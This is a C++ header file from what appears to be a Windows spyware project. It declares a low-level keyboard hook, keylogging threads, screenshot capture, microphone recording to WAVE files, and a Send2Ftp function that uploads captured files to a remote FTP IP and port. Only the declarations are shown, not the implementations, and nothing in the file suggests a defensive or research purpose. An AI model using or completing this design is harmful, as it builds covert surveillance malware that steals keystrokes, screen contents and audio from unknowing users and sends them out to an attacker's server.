#pragma once

#include <Windows.h>
#include <ctime>
#include <fstream>
#include <wininet.h>
#include <GdiPlus.h>
#include <mmsystem.h>
#include <string>
#include <Vfw.h>

#pragma comment(lib, "wininet.lib")
#pragma comment (lib,"gdiplus.lib")
#pragma comment(lib, "winmm.lib")

#pragma warning(disable: 4996)

int StartKeyLogging();

void Send2Ftp(LPCSTR filePath, LPCSTR ftpIP, int ftpPort);

bool FileExists(LPCSTR fileName);

DWORD recordWAVEFile(DWORD dwMilliSeconds);

DWORD WINAPI voiceThread(LPVOID parameter);
DWORD WINAPI keyloggerThread(LPVOID parameter);
DWORD WINAPI ScreenShotThread(LPVOID parameter);
DWORD WINAPI KeyloggerScanThread(LPVOID parameter);

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
